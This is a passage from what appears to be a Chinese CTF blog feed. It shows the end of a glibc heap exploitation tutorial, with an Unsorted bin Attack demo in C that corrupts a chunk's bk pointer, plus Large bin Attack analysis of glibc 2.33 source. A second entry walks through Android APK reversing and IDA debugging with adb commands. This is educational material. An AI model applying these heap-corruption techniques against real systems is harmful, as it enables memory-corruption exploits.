punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"bk pointer point to %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*------------VULNERABILITY-----------*/</span>  p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>target_var <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//------------------------------------</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来，我们通过 GDB 调试分析一下整个过程</p><p>首先分配了两个堆块 <code>chunk1</code> 和 <code>chunk2</code>，其中第二个堆块用来防止与 <code>top chunk</code> 合并</p><p>然后释放 <code>chunk1</code>，将其置于 <code>unsorted bin</code> 中，可以看到其 <code>bk</code> 指针指向 <code>0x00007ffff7dd1b78</code>，由于此时 <code>unsorted bin</code> 只有一个，因此 <code>fd</code> 与 <code>bk</code> 指针相同</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A866.png" alt="CTF - PWN_堆相关的漏洞与利用66.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A873.png" alt="CTF - PWN_堆相关的漏洞与利用73.png"></p><p>假设我们通过堆溢出或其他手段修改 <code>bk</code> 指针，使其指向 <code>target_var - 16</code> 的位置（这里是以 64 位程序作为示例，如果是 32 位程序，则指向 <code>target_var - 8</code> 的位置）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A867.png" alt="CTF - PWN_堆相关的漏洞与利用67.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A872.png" alt="CTF - PWN_堆相关的漏洞与利用72.png"></p><p><code>target_var - 16</code> 处是我们伪造的 <code>chunk</code>，即：<code>target_var</code> 处于伪造 <code>chunk</code> 的 <code>fd</code> 处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A868.png" alt="CTF - PWN_堆相关的漏洞与利用68.png"></p><p>然后，我们通过 <code>malloc(400)</code> 再次申请相同大小的空间</p><p>由于所申请的 <code>chunk</code> 处于 <code>small bin</code> 所在的范围，其对应的 <code>bin</code> 中暂时没有 <code>chunk</code>，所以会去 <code>unsorted bin</code> 中找，发现 <code>unsorted bin</code> 不为空，于是把 <code>unsorted bin</code> 中的最后一个 <code>chunk</code> 取出来，而 <code>unsorted bin</code> 中的最后一个 <code>chunk</code> 是我们伪造的 <code>chunk</code></p><p>此时堆并没有什么改变，依然是 <code>unsorted bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A869.png" alt="CTF - PWN_堆相关的漏洞与利用69.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A871.png" alt="CTF - PWN_堆相关的漏洞与利用71.png"></p><p>但是 <code>0x7fffffffdc88</code>（<code>target_var</code>）地址处已经被修改为 <code>unsorted bin</code> 的链表头部 <code>0x00007ffff7dd1b78</code>，即 <code>fd</code> 指针：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A870.png" alt="CTF - PWN_堆相关的漏洞与利用70.png"></p><blockquote><p>注意：</p><p>虽然我们修改了 <code>target</code> 处的值，但 <code>unsorted bin</code> 链表也可能就此破坏，在插入 <code>chunk</code> 时，可能会出现问题</p></blockquote><p>从上面的示例我们可以看到，<strong>Unsorted bin Attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大</strong>，一般可以作为以下用途：</p><ul><li>我们通过修改循环的次数来使得程序可以执行多次循环  </li><li>我们可以修改 <code>heap</code> 中的 <code>global_max_fast</code> 来使得更大的 <code>chunk</code> 可以被视为 <code>fast bin</code>，这样我们就可以去执行一些 <code>fast bin attack</code> 了</li></ul><hr><h1 id="Large-bin-Attack"><a href="#Large-bin-Attack" class="headerlink" title="Large bin Attack"></a>Large bin Attack</h1><blockquote><p>Large bin Attack 是一类漏洞的利用方法，是指所有基于 <code>large bin</code> 机制的漏洞利用方法</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">Large Bin Attack - CTF Wiki</a></p></blockquote><p>Large bin Attack 主要利用的是 <code>chunk</code> 进入 <code>bin</code> 中的操作，在 <code>malloc</code> 的时候，遍历 <code>unsorted bin</code> 时，对每一个 <code>chunk</code>，若无法 <code>exact-fit</code> 分配或不满足切割分配的条件，就会将该 <code>chunk</code> 置入相应的 <code>bin</code> 中，而此过程中缺乏对 <code>large bin</code> 的跳表指针的检测</p><p>Glibc 2.33 中关于 Large bin 的入 bin 操作：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>              victim_index <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>              bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>              fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>              <span class="token comment">/* maintain large bins in sorted order */</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>fwd <span class="token operator">!=</span> bck<span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                  <span class="token comment">/* Or with inuse bit to speed comparisons */</span>                  size <span class="token operator">|=</span> PREV_INUSE<span class="token punctuation">;</span>                  <span class="token comment">/* if smaller than smallest, bypass loop below */</span>                  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span>              <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">&#123;</span>                      fwd <span class="token operator">=</span> bck<span class="token punctuation">;</span>                      bck <span class="token operator">=</span> bck<span class="token operator">-></span>bk<span class="token punctuation">;</span>                      victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>                      victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>                      fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                  <span class="token keyword">else</span>                    <span class="token punctuation">&#123;</span>                      <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">&lt;</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token punctuation">&#123;</span>                          fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>              <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size              <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment">/* Always insert in the second position.  */</span>                        fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>                      <span class="token keyword">else</span>                        <span class="token punctuation">&#123;</span>                          victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>                          victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>                          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): largebin double linked list corrupted (nextsize)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>                          victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                      bck <span class="token operator">=</span> fwd<span class="token operator">-></span>bk<span class="token punctuation">;</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> fwd<span class="token punctuation">)</span>                        <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): largebin double linked list corrupted (bk)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 Glibc 2.29 及以下的版本中，根据 <code>unsorted bin chunk</code> 的大小不同</p><p>在 <code>unsorted bin chunk</code> 小于链表中最小的 <code>chunk</code> 的时候会执行前一句，反之执行后一句：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>由于两者大小相同的时候只会使用如下的方法插入，所以此时无法利用：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size              <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment">/* Always insert in the second position.  */</span>                        fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向与动态调试</title>
      <link href="/posts/13f0410d.html"/>
      <url>/posts/13f0410d.html</url>
      
        <content type="html"><![CDATA[<h1 id="安卓-APK-逆向"><a href="#安卓-APK-逆向" class="headerlink" title="安卓 APK 逆向"></a>安卓 APK 逆向</h1><blockquote><p>Android 的逆向主要分为两个层面：</p><ol><li>Java 层  </li><li>原生层</li></ol><p>Android 逆向常用工具 jadx 下载地址：<a href="https://github.com/skylot/jadx">GitHub - skylot&#x2F;jadx: Dex to Java decompiler</a></p></blockquote><p>首先了解一下 Android：</p><ul><li>Android 也可以看成是 Linux 的一个发行版，但不是 GNU&#x2F;Linux</li><li>Ubuntu、Kali 等也是 Linux 的发行版，但都是基于 GNU&#x2F;Linux 的发行版，它们的应用层用的是 GNU（glibc、libstdc++、GNU CoreUtils 等）</li><li>也就是说，Android 和 Ubuntu、Kali 等基于 GNU&#x2F;Linux 的 Linux 发行版是不一样的，Android 的应用层是自己独有的，不依赖于 GNU</li></ul><hr><h2 id="Java-层"><a href="#Java-层" class="headerlink" title="Java 层"></a>Java 层</h2><blockquote><p>简而言之，就是直接分析 APK 的 <code>MainActivity</code> 方法，不存在其他的链接库调用，一般仅需要掌握 Java 语言即可</p></blockquote><p>用 jadx 打开 apk 程序后，主要方法 <code>MainActivity</code> 通常位于 <code>com.xxx.xxx</code> 下</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%911.png" alt="CTF - REVERSE_Android 逆向1.png"></p><p>对于 <code>MainActivity</code> 中的一些字符串变量，例如：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%912.png" alt="CTF - REVERSE_Android 逆向2.png"></p><p>这里的 <code>C0535R.string.table</code> 可以在如下路径中找到：<code>资源文件/resources.arsc/res/values/strings.xml</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%913.png" alt="CTF - REVERSE_Android 逆向3.png"></p><p>jadx 分析 Android 的 Java 层代码和 IDA 分析 C&#x2F;C++ 程序一样，从 <code>MainActivity</code> 开始一路分析即可</p><blockquote><p>Android 程序 Java 层逆向例题见本站 <em>《<a href="%E3%80%90%E6%A5%9A%E6%85%A7%E6%9D%AF%202023%E3%80%91Level_One.md">【楚慧杯 2023】Level_One</a>》</em></p></blockquote><hr><h2 id="原生层"><a href="#原生层" class="headerlink" title="原生层"></a>原生层</h2><blockquote><p>原生层也叫 Native 层，指的是 Android 操作系统的底层，包括 Linux 内核和各种 C&#x2F;C++ 库</p><p>Native 层通常会使用 <code>so</code> 文件来实现相关的方法，有点类似于 Linux 中的动态链接库，一般需要掌握 Java 语言、C&#x2F;C++ 语言、汇编语言</p></blockquote><p><strong>Android 的 apk 程序实质上也是一个压缩包，我们可以对 apk 程序直接进行解压</strong>（使用 7-zip 或者 WinRAR 都可以）</p><p>然后会得到如下结构的目录：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%914.png" alt="CTF - REVERSE_Android 逆向4.png"></p><p>其实细心一点可以发现，这个目录结构和 jadx 中看到的结构是一样的</p><p>而 <code>so</code> 文件通常在 <code>lib</code> 文件夹下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%915.png" alt="CTF - REVERSE_Android 逆向5.png"></p><blockquote><p><strong>由于 Android 程序需要考虑适配市面上不同手机的 CPU 架构，因此会生成支持不同平台的 <code>so</code> 文件进行兼容</strong></p></blockquote><p>这里每一个文件夹中的 <code>so</code> 文件就对应了一个 CPU 架构</p><p>它们的内容几乎都是一样的，分析其中之一即可，通常是在 IDA 中分析 <code>x86</code> 或 <code>x86_64</code> 架构</p><blockquote><p>Android 程序原生层逆向例题见本站 <em>《<a href="%E3%80%90%E6%A5%9A%E6%85%A7%E6%9D%AF%202023%E3%80%91Level_up.md">【楚慧杯 2023】Level_up</a>》</em></p></blockquote><hr><h3 id="什么是-so"><a href="#什么是-so" class="headerlink" title="什么是 so"></a>什么是 so</h3><blockquote><p>与 Linux 类似，Native 层代码通常存在于 <code>so</code> 文件中，<code>so</code> 文件全称为 Shared Object，使用 <code>so</code> 可以提高开发效率、快速移植</p><p>开发 Android 应用时，有时候 Java 层的编码不能满足实现需求，就需要使用 C&#x2F;C++ 实现，然后生成 so 文件，常见的场景有：加解密算法、音视频编解码等</p></blockquote><p><code>so</code> 文件的加载通常有两种方式：</p><ul><li><code>loadLibrary</code> 加载（<strong>主要使用</strong>）</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span>   <span class="token comment">// 调用项目中 lib 目录下的 libxxx.so 文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一般通过 JNI 来实现</p><blockquote><p>JNI 全名 Java Native Interface，是 Java 本地接口</p><p>JNI 是 Java 调用 Native 语言的一种特性，通过 JNI 可以使 Java 与 C&#x2F;C++ 机型交互，简单点说就是 JNI 是 Java 中调用 C&#x2F;C++ 的统称</p></blockquote><p>在 Android 中 JNI 的实现示例如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%916.png" alt="CTF - REVERSE_Android 逆向6.png"></p><p>这里通过 JNI 从 <code>libSecret_entrance.so</code> 文件中调用了两个方法：  </p><p>① <code>Java_com_example_re11113_jni_getiv(__int64 a1)</code><br>② <code>Java_com_example_re11113_jni_getkey(__int64 a1)</code>  </p><ul><li><code>load</code> 加载（主要用于在插件中加载 <code>so</code> 文件）</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span>   <span class="token comment">// xxx 对应 lib 的绝对路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="IDA-动态调试安卓-so"><a href="#IDA-动态调试安卓-so" class="headerlink" title="IDA 动态调试安卓 so"></a>IDA 动态调试安卓 so</h1><blockquote><p>使用 IDA 动态调试意味着我们要将 apk 运行起来，可以使用模拟器（如：雷电模拟器），也可以使用真实的安卓手机（建议拥有 root 权限）</p><p>当然有 root 的真机最好，用 Android 模拟器来动态调试 <code>so</code> 文件可能无法进行某些步骤</p><p>adb 命令使用方法：<a href="https://zhuanlan.zhihu.com/p/89060003">ADB 命令大全 - 知乎</a></p></blockquote><p>在 IDA 的 <code>dbgsrv</code> 目录下有许多远程调试用的服务程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%917.png" alt="CTF - REVERSE_Android 逆向7.png"></p><p>调试安卓用到的主要是上图红框中的程序，但它们也有区别：</p><ul><li><p><em>真实的安卓手机通常是 ARM 架构，对应 <code>android_server</code> 和 <code>android_server_64</code></em></p></li><li><p><em>模拟器（如：雷电模拟器）通常是 x86 架构，对应 <code>android_x86_server</code> 和 <code>android_x64_server</code></em></p></li></ul><p>我这里主要以雷电模拟器作为例子</p><p>以《2024 WIDC 天融信杯》的《Day2-debug 算法逆向》这道题来说明</p><p>用 jadx 打开 apk，定位到 <code>MainActivity</code>，主要与 <code>getFlag()</code> 函数有关：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9117.png" alt="CTF - REVERSE_Android 逆向17.png"></p><p>函数的定义在 <code>libread.so</code> 文件中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9118.png" alt="CTF - REVERSE_Android 逆向18.png"></p><p>关键加密逻辑在于：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>LABEL_16<span class="token operator">:</span>    v62 <span class="token operator">=</span> v3<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">9u</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v62 <span class="token operator">=</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">45</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5u</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x30</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x19u</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x19u</span> <span class="token punctuation">)</span>        v62 <span class="token operator">=</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1Au</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      v62 <span class="token operator">=</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">94</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1Au</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v5<span class="token punctuation">[</span>v7<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> v62 <span class="token operator">^</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> v7 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> buff<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里对 <code>v62</code> 进行了处理，分别对应 <code>v62</code> 为 <code>0 ~ 9</code>、<code>a ~ z</code> 和 <code>A ~ Z</code> 的情况，循环次数为 <code>v6</code>，最后将加密后的数据与 <code>buff</code> 比较，显然 <code>v5</code> 是明文，<code>buff</code> 是密文</p><p>但是 <code>buff</code> 处并没有内容，因此可能是动态生成的，必须动态调试才能拿到密文</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9119.png" alt="CTF - REVERSE_Android 逆向19.png"></p><p>下载雷电模拟器：<a href="https://www.ldmnq.com/">雷电安卓模拟器-手游模拟器安卓版_android手机模拟器电脑版_雷电模拟器官网</a></p><p><strong>雷电模拟器要开启 root 模式，否则 IDA 找不到要附加的进程</strong></p><p>然后在雷电模拟器的安装路径下，有一个 <code>adb.exe</code> 程序，我这里是 <code>D:\leidian\LDPlayer9</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%919.png" alt="CTF - REVERSE_Android 逆向9.png"></p><p>将该路径加入环境变量，便可以在 CMD 中直接使用 <code>adb</code> 命令：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%918.png" alt="CTF - REVERSE_Android 逆向8.png"></p><p>将 apk 程序安装到雷电模拟器，并保证其可以正常运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9110.png" alt="CTF - REVERSE_Android 逆向10.png"></p><p>在 IDA 的 <code>dbgsrv</code> 目录下打开 CMD</p><p>测试一下是否能连接到雷电模拟器：（**一般只要安卓设备连接正确，会自动启动 <code>adb server</code>**）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb devices<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9111.png" alt="CTF - REVERSE_Android 逆向11.png"></p><p>以 root 权限运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9112.png" alt="CTF - REVERSE_Android 逆向12.png"></p><p>将 IDA 的 Android 调试服务程序推送到雷电模拟器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb push android_x64_server /data/local/tmp   <span class="token comment"># 也可以选择推送到其他路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 